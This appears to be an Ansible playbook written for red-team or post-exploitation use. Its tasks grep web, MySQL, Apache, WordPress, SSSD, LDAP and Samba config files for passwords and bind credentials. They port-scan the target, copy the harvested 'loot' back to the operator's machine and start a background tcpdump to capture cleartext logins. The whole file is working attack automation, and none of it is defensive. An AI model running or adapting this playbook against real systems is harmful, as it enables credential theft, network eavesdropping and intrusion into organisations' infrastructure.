---
# SECTION 1: DATABASE & WEB CREDENTIALS
- name: Extract Database and Web Credentials
  become: yes
  shell: |
    # Keeping the high-volume search but cleaning the PHP constants a bit
    grep -rEo "(db_user|db_pass|db_name|db_host|password|passwd)[:=]\s*['\"]?[^'\" \t\n;]+['\"]?" /var/www /etc/mysql /etc/apache2 2>/dev/null | grep -vE "(\.png|\.jpg|\.svg|\.gif)" || true
    grep -rE "DB_(PASSWORD|USER|HOST|NAME)" /var/www/html/wp-config.php 2>/dev/null || true
  register: db_results
  changed_when: false

# SECTION 2: SYSTEM PORT SCAN (Fixed Logic)
- name: Scan Target Ports from Red Workstation
  delegate_to: localhost
  shell: |
    # Scanning the target IP FROM your workstation
    nmap -sT -T4 --open {{ ansible_host }} | grep "tcp open"
  register: port_scan_results
  become: no

# SECTION 3: AD/LDAP BIND INFO
- name: Extract AD and LDAP Bind Info
  become: yes
  shell: |
    grep -rEio "(bind_dn|bind_pw|ad_domain|ad_server|ldap_uri|ldap_password)" /etc/sssd /etc/ldap /etc/samba 2>/dev/null | sort -u
  register: ad_bind_results
  failed_when: false

# SECTION 4: DELIVERY
- name: Deliver Organized Service Loot
  delegate_to: localhost
  copy:
    content: |
      === SERVICE HARVEST: {{ inventory_hostname }} ===
      [DATABASE & WEB AUTH]
      {{ db_results.stdout }}

      [OPEN PORTS]
      {{ port_scan_results.stdout }}

      [AD/LDAP BIND]
      {{ ad_bind_results.stdout }}
    dest: "{{ playbook_dir }}/loot/{{ inventory_hostname }}/service_creds.txt"
  become: no

# SECTION 5: LIVE ALERT
- name: CATEGORIZED LOOT ALERT
  debug:
    msg:
      - "--- DB/WEB ---"
      - "{{ db_results.stdout_lines | default(['None']) }}"
      - "--- OPEN PORTS ---"
      - "{{ port_scan_results.stdout_lines | default(['None']) }}"
      - "--- AD BIND INFO ---"
      - "{{ ad_bind_results.stdout_lines | default(['None']) }}"

# SECTION 6: NOISY NETWORK SNIFFER (Broad Intel)
- name: Start Background Network Sniffer
  delegate_to: localhost
  run_once: true
  become: yes
  shell: |
    # This now catches ANY traffic on Port 80, 21 (FTP), and 23 (Telnet)
    # It will show you headers, hostnames, and potential cleartext logins
    nohup tcpdump -i ens8 -A -nn -l 'port 80 or port 21 or port 23' > {{ playbook_dir }}/loot/network_sniff.log 2>&1 &